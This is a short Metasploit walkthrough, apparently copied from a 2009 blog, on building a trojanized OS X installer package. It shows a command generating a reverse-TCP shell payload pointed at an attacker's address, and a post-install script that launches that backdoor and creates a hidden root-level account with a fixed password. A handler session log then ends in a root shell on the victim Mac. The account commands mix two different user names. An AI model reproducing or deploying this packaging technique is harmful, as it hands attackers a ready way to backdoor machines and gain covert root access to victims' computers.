@@ -1,0 +1,65 @@
+Evil Packaging on OSX with Xcode and Metasploit
+
+root@bt:/pentest/exploits/framework3# ./msfpayload osx/x86/shell_reverse_tcp LHOST=192.168.1.103 X > osxexe
+
+Created by msfpayload (http://www.metasploit.com).
+
+Payload: osx/x86/shell_reverse_tcp
+
+ Length: 65
+
+Options: LHOST=192.168.1.103
+
+
+#!/bin/sh
+
+#run Backdoor
+/usr/bin/osxexe &
+#create user account with admin privs
+dscl . -create /Users/dark
+dscl . -create /Users/dark UserShell /bin/bash
+dscl . -create /Users/toddharris RealName "Darkoperator"
+dscl . -create /Users/toddharris UniqueID 0
+dscl . -create /Users/toddharris PrimaryGroupID 0
+dscl . -passwd /Users/dark P@55w0rd
+#
+
+
+
+msf > use exploit/multi/handler 
+
+msf exploit(handler) > set PAYLOAD osx/x86/shell_reverse_tcp 
+
+PAYLOAD => osx/x86/shell_reverse_tcp
+
+msf exploit(handler) > set LHOST 192.168.1.103 
+
+LHOST => 192.168.1.103
+
+msf exploit(handler) > set ExitOnSeesion false
+
+ExitOnSeesion => false
+
+msf exploit(handler) > exploit
+
+[*] Handler binding to LHOST 0.0.0.0
+
+[*] Started reverse handler
+
+[*] Starting the payload handler...
+
+[*] Command shell session 1 opened (192.168.1.103:4444 -> 192.168.1.120:58942)
+
+id
+
+uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),8(procview),29(certusers),3(sys),9(procmod),4(tty),5(operator),80(admin),20(staff)
+
+pwd
+
+/
+
+uname -a
+
+Darwin carlos-perezs-computer.local 9.6.0 Darwin Kernel Version 9.6.0: Mon Nov 24 17:37:00 PST 2008; root:xnu-1228.9.59~1/RELEASE_I386 i386
+
+http://www.darkoperator.com/blog/2009/4/25/evil-packaging-on-osx-with-xcode-and-metasploit.html
